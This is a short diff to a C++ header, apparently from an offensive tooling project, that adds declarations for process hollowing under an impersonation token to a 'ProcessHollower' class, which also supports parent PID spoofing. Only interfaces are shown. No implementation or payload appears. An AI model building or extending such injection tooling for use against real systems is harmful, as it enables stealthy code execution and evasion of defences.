@@ -29,6 +29,7 @@ private:
     bool verbose = false;
 
     bool create_suspended_process(const wchar_t* target_path);
+    bool create_suspended_process_as_user(const wchar_t* target_path, HANDLE hToken);
 
 public:
     ProcessHollower(bool verbose_mode = false, DWORD ppid = 0) : verbose(verbose_mode), parent_pid(ppid) {}
@@ -36,6 +37,9 @@ public:
 
     // Hollowing: create suspended + PE entry point injection
     bool HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& payload);
+
+    // Hollowing with impersonation token: create suspended process as specific user + PE injection
+    bool HollowProcessAsUser(const wchar_t* target_exe, const std::vector<uint8_t>& payload, HANDLE hToken);
 
     void SetParentPID(DWORD ppid) { parent_pid = ppid; }
 
